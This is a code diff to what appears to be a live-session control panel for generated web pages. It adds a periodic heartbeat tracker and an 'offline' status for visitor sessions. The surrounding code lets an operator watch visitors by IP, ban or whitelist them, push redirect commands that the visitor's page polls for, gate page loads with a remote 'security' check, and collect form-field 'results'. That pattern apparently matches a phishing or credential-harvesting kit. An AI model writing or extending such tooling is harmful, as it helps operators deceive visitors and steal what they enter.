@@ -853,14 +853,15 @@ function compactSessionMarkup(session, page, bannedIps = [], whitelistIps = [], 
   const currentFlowLabel = sessionCurrentFlowLabel(activeSession, latestResult, command);
   const isBlocked = ipStatus === "Banned" || String(activeSession?.result || "").toLowerCase() === "blocked";
   const commandStatus = command?.status || (command?.targetUrl ? "queued" : "none");
-  const rowStatus = isBlocked ? "blocked" : commandStatus === "queued" ? "queued" : activeSession ? "live" : commandStatus === "delivered" ? "delivered" : "idle";
+  const rowStatus = isBlocked ? "blocked" : commandStatus === "queued" ? "queued" : activeSession ? "live" : commandStatus === "delivered" ? "delivered" : "offline";
   const filterTokens = Array.from(new Set([
     rowStatus,
     activeSession ? "live" : "",
     commandStatus === "queued" ? "queued" : "",
     commandStatus === "delivered" ? "delivered" : "",
     isBlocked ? "blocked" : "",
-    session.results.length ? "has-results" : "idle"
+    session.results.length ? "has-results" : "idle",
+    activeSession ? "" : "offline"
   ].filter(Boolean))).join(" ");
   const searchText = [
     session.sessionId,
@@ -883,7 +884,7 @@ function compactSessionMarkup(session, page, bannedIps = [], whitelistIps = [], 
         <div class="compact-session-meta">
           <span>IP ${escapeHtml(sessionIp)}</span>
           <span>${escapeHtml(ipStatus)}</span>
-          <span>${activeSession ? "Live now" : escapeHtml(lastSeen)}</span>
+          <span>${activeSession ? "Live now" : `Offline / ${escapeHtml(lastSeen)}`}</span>
         </div>
         ${sessionCommandMarkup(session.sessionId, page.slug, pageTargets, command, currentFlowLabel)}
       </summary>
@@ -1738,6 +1739,14 @@ function createGeneratedIndex(page) {
         });
       }
 
+      function trackHeartbeat() {
+        trackTraffic("heartbeat", {
+          metadata: {
+            visibility: document.visibilityState || "visible"
+          }
+        });
+      }
+
       function sameLocation(targetUrl) {
         try {
           const target = new URL(targetUrl, window.location.href);
@@ -1770,6 +1779,7 @@ function createGeneratedIndex(page) {
       }
 
       window.setInterval(checkSessionCommand, 4000);
+      window.setInterval(trackHeartbeat, 10000);
 
       function fieldsFor(screen) {
         return String(screen.config.fields || "")
@@ -1982,6 +1992,7 @@ function createGeneratedIndex(page) {
         const remoteAllowed = await checkRemoteSecurity("boot");
         if (!remoteAllowed) return;
         trackTraffic("page_load");
+        trackHeartbeat();
         renderStep();
       }
 
@@ -4198,6 +4209,7 @@ async function renderResultsCenter(pageSlug = "page-a", options = {}) {
               ["queued", "queued"],
               ["delivered", "delivered"],
               ["blocked", "blocked"],
+              ["offline", "offline"],
               ["has-results", "has results"],
               ["idle", "idle"]
             ].map(([filter, label], index) => `
